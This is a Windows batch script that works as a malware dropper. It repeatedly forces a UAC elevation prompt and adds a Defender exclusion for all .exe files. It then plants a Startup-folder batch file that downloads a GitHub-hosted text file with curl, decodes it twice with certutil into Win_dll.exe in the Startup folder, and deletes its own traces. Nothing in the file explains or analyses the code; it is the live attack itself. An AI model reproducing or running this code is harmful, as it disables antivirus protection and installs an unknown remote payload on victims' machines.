@echo off
:: BatchGotAdmin
:-------------------------------------
REM  --> Check for permissions
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"

REM --> If error flag set, we do not have admin.
if '%errorlevel%' NEQ '0' (
    
    goto UACPrompt
) else ( goto gotAdmin )
:UACPrompt
    cd "%appdata%\Microsoft\Windows\Start Menu\Programs\"
    if exist Interleave.txt ( 
        exit /B  
    ) else ( 
        echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
        set params = %*:"=""
        echo UAC.ShellExecute "cmd.exe", "/c %~s0 %params%", "", "runas", 1 >> "%temp%\getadmin.vbs" 
        "%temp%\getadmin.vbs" 
        del "%temp%\getadmin.vbs" 
        timeout /t 1 > nul 
        goto UACPrompt
        
        )
:gotAdmin 
    Powershell -Command "Set-MpPreference -ExclusionExtension exe"
    pushd "%%CD%%" 
    CD /D "%%~dp0" 
:-------------------------------------- 
echo by auto windows10 > "%appdata%\Microsoft\Windows\Start Menu\Programs\Interleave.txt" 
echo cd "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\" > "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\Dp.bat"
echo if exist Win_dll.exe ( >> "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\Dp.bat"
echo     del "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\Dp.bat" >> "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\Dp.bat"
echo     exit /B >> "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\Dp.bat" 
echo ) >> "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\Dp.bat"
echo curl -s -o "%userprofile%\Pictures\edmy.txt" https://raw.githubusercontent.com/ryn2020/ryn/main/TAS.txt >> "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\Dp.bat"
echo certutil -decode "%userprofile%\Pictures\edmy.txt" "%userprofile%\Pictures\dll.txt" >> "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\Dp.bat"
echo certutil -decode "%userprofile%\Pictures\dll.txt" "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\Win_dll.exe" >> "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\Dp.bat"
del %0
